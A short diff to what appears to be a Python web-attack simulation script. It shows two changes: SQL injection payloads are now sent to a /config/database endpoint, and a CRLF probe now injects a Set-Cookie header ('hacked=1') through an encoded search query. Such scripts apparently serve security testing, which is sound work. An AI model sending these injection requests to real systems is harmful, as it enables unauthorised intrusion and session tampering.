@@ -114,7 +114,7 @@ def phase_sqli():
     ]
     for p in payloads:
         send("POST", "/api/users", p, label="SQL Injection")
-        send("POST", "/admin/login", p, label="SQL Injection")
+        send("POST", "/config/database", p, label="SQL Injection")
         if _exit_flag.is_set():
             return
         time.sleep(DELAY_SHORT)
@@ -251,7 +251,7 @@ def phase_crlf():
     ]
     for p in payloads:
         send("POST", "/api/users", p, label="CRLF Injection")
-        send("GET", "/api/search",  label="CRLF probe")
+        send("GET", "/api/search?q=test%0d%0aSet-Cookie:hacked=1",  label="CRLF probe")
         if _exit_flag.is_set():
             return
         time.sleep(DELAY_SHORT)
